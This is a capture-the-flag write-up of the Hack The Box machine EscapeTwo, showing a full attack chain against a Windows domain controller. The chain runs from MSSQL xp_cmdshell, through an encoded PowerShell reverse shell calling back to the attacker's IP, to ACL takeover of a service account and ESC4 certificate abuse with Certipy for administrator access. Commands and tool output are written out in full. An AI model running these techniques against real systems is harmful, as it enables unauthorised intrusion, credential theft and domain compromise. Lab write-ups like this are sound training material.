---
layout: post
title: EscapeTwo
date: 2025-06-02 10:00:00 +0100
categories: [Walkthroughs]
tags: [htb, windows, active directory, ADCS]
---
![alt text](https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | Hack The box       |
| OS | Windows        |
| Difficulty | Easy        |
| Release Date | 11 Jan 2025        |
| Link to machine | [EscapeTwo](https://app.hackthebox.com/machines/642)        |

# Highlights
Netexec, MSSQL, Certipy, ADCS, Windows Privilege Escalation

---

# Open Ports Enumeration
Nmap scan:

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-02 20:17:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-02T20:18:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-06-02T20:18:37+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-06-02T20:18:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-02T19:54:23
|_Not valid after:  2055-06-02T19:54:23
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-06-02T20:18:37+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-02T20:18:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
49804/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-02T20:17:59
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   55.01 ms 10.10.16.1
2   55.12 ms sequel.htb (10.10.11.51)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 337.41 seconds
```

From the open ports we see with the ```nmap``` scan, we know this is a domain controller, so we can add ```sequel.htb``` and ```DC01.sequel.htb``` to our ```/etc/hosts``` file.

Interestingly, there is port ```1433``` open, which is ```MSSQL```

```bash
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-06-02T20:18:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-02T19:54:23
|_Not valid after:  2055-06-02T19:54:23
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
```


# Assumed breach scenario

This machine wants to simulate a real world pentest, so it provides credentials, so we can start the enumeration right away:
* Username: ```rose```
* Password: ```KxEPkKe6R8su```

# Netexec user enumeration

```bash
netexec smb sequel.htb -u rose -p 'KxEPkKe6R8su' --users
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                             
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-          
SMB         10.10.11.51     445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain                                                                                                      
SMB         10.10.11.51     445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain                                                                                                    
SMB         10.10.11.51     445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account                                                                                                                     
SMB         10.10.11.51     445    DC01             michael                       2024-06-08 16:47:37 0        
SMB         10.10.11.51     445    DC01             ryan                          2024-06-08 16:55:45 0        
SMB         10.10.11.51     445    DC01             oscar                         2024-06-08 16:56:36 0        
SMB         10.10.11.51     445    DC01             sql_svc                       2024-06-09 07:58:42 0        
SMB         10.10.11.51     445    DC01             rose                          2024-12-25 14:44:54 0        
SMB         10.10.11.51     445    DC01             ca_svc                        2025-06-02 20:17:30 0        
SMB         10.10.11.51     445    DC01             [*] Enumerated 9 local users: SEQUEL
```
Let's save those users in a ```users.txt``` file

# Netexec shares enumeration

```bash
netexec smb sequel.htb -u rose -p 'KxEPkKe6R8su' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ 
```

On top of the usual shares we find on a DC, we also have ```Users``` and ```Accounting Department``` with ```READ``` access with the given account.

# Accounting Department Share Access 
In the ```Accounting Department``` share, we find 2 files:
* ```accounting_2024.xlsx```
* ```accounts.xlsx```

```bash
smbclient \\\\sequel.htb\\Accounting\ Department -U 'rose' -p 'KxEPkKe6R8su'
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 11:52:21 2024
  ..                                  D        0  Sun Jun  9 11:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 11:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 11:52:07 2024

                6367231 blocks of size 4096. 927315 blocks available
smb: \> 
```


To open those files, various methods can be used, both from linux and windows, this time I choose to use [https://jumpshare.com](https://jumpshare.com), which allows to upload and open xlsx files.
# Accounts.xlsx contents 
The accounts.xlxs file contains usernames and passwords. We take note of the users ```angela```, ```kevin``` and ```sa``` that did not come up on our netexec users enum and add them to the ```users.txt``` file, as well as creating a ```passwords.txt``` file with all the password we have found so far. The file ```Accounting_2024.xlsx``` di not contain any information that is relevant to us.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/escapetwo/escapetwo1.png?raw=true)


# Password spraying

Using netexec once more, we password spray ```SMB``` and ```LDAP``` without much luck, until we use ```MSSQL```, were we get a hit:

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/escapetwo/escapetwo2.png?raw=true)

# Foothold
Using ```impacket-mssqlclient``` we can login to database and check if ```xp_cmdshell``` can be enabled, which in our case, it is.
Further explanation can be found on [Hacking Articles MSSQL for Pentester](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/).


```bash
impacket-mssqlclient sa:'************'@sequel.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query

SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL             

SQL (sa  dbo@master)> 

```
We use xp_cmdshell to pivot to a ```reverse shell```, creating a ```base64``` encoded ```powershell payload``` using [revshells.com](https://www.revshells.com/).

* Step 1 : Start ```nc listener``` on the attack machine.

```bash
nc -nvlp 4444                                                                                        
listening on [any] 4444 ...

```

* Step 2 : Run ```xp_cmdshell``` + the payload created on ```revshells``` on the victim machine.

```bash
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

```

If successfull, you should get a reverse shell

```bash
nc -nvlp 4444                                                                                        
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.51] 50186
```
# Directories Enumeration

Starting from the ```C drive```, we see a ```SQL2019``` folder which is not usually there by default, being the domain name called ```sequel``` thats a hint that we cannot overlook.

```bash
PS C:\Windows\system32> cd C:\
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        11/5/2022  12:03 PM                PerfLogs                                                              
d-r---         1/4/2025   7:11 AM                Program Files                                                         
d-----         6/9/2024   8:37 AM                Program Files (x86)                                                   
d-----         6/8/2024   3:07 PM                SQL2019                                                               
d-r---         6/9/2024   6:42 AM                Users                                                                 
d-----         1/4/2025   8:10 AM                Windows

```

Inside the ```SQL2019```, there is a directory called ```ExpressAdv_ENU```, which contains the file ```sql-Configuration.ini```.
The contents of this file can be read using the command ```type sql-configuration.INI``` which reveals a new password we did not have.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/escapetwo/escapetwo3.png?raw=true)

So we add this password to our ```passwords.txt``` file

# Password Spraying (Again!)
Yes you guessed it, since password reuse is very common, every time a new credential is found, is good practice to respray the whole network with it.
This is how we find out that the password we found fo ```sql_svc``` is being reused for the user ```ryan```

# Bloodhound Enumeration
It's time to put bloodhound to work, so after collecting the data we need with ```bloodhound-python```, we upload it to bloodhound for ingestion.
Checking the user ```ryan``` we see that he is part of the ```Remote Management Group```, and port ```5985``` being open, we can use ```evil-winrm``` to start a shell and possibly collect our user flag.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/escapetwo/escapetwo4.png?raw=true)

```bash
evil-winrm -i sequel.htb -u ryan -p '****************' 
*Evil-WinRM* PS C:\Users\ryan\Documents> dir C:\Users\ryan\Desktop


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/2/2025  12:54 PM             34 user.txt
```

# Pivot to ca_svc

The user ```ryan``` has 1 ```outbound object control``` which is the account ```ca_svc```
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/escapetwo/escapetwo5.png?raw=true)

Following Bloodhound step-by-step guide, we can take over the account:

* Change the ownership of the object

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'****************' -dc-ip 10.10.11.51 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!

```
* Grant ourselves full control over ca_svc

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'****************' -dc-ip 10.10.11.51
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250602-224815.bak
[*] DACL modified successfully!
```
* Force password change for ca_svc

```bash
net rpc password 'ca_svc' 'Password123!' -U 'sequel.htb'/'ryan'%'****************' -S 'DC01.sequel.htb'
```


# Privilege Escalation

Now that we own ca_svc, looking at the groups, we can see that is part of Cert Publishers, and the Display Name is Certification Authority.
This strongly suggest a certificate exploit to either forge a certificate or impersonate the administrator.
After some research, we find the ```Certipy Wiki```, an extensive documentation on how to use the tool to exploit ```ADCS misconfigurations``` [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).


We start by looking at the certificate templates, using the ```-text``` flag to have a txt output, ```-enabled``` to filter out the disabled ones, and ```-hide-admins``` to filter out the ones requiring to be part of any admin AD groups.
```bash
certipy-ad find  -u 'ca_svc@sequel.htb' -p 'Password123!' -dc-ip '10.10.11.51' -text -enabled -hide-admins
```

We find an interesting one, ```DunderMifflinAuthentication``` which has all the conditions required to abuse ESC4 as documented in the wiki.

```bash
Template Name                       : DunderMifflinAuthentication

Permissions
      Object Control Permissions
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Cert Publishers
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```
* We modify the template to a vulnerable state

```bash
certipy-ad template -u ca_svc -p 'Password123!' -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -write-default-configuration
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```
* We request a certificate using the modified template

```bash
certipy-ad req -u 'ca_svc@sequel.htb' -p 'Password123!' -dc-ip 10.10.11.51 -target sequel.htb -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -sid 'S-1-5-21-548670397-972687484-3496335370-500' 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-548670397-972687484-3496335370-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx' 
```
* We authenticate using the ```pfx certificate``` obtained to receive the administrator ```NTLM``` hash

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.10.11.51                                             
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-548670397-972687484-3496335370-500'
[*]     Security Extension SID: 'S-1-5-21-548670397-972687484-3496335370-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': ************************:************************   
```
* We authenticate to the DC using the ```NT``` hash and collect our root flag

```bash
evil-winrm -i sequel.htb -u administrator -H '************************'

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/2/2025   3:21 PM             34 root.txt
```
This box was way harder then "easy" in my opinion, but seems like Hack The Box rating system has changed to a different standard as many users are now seasoned hackers.

Enjoy!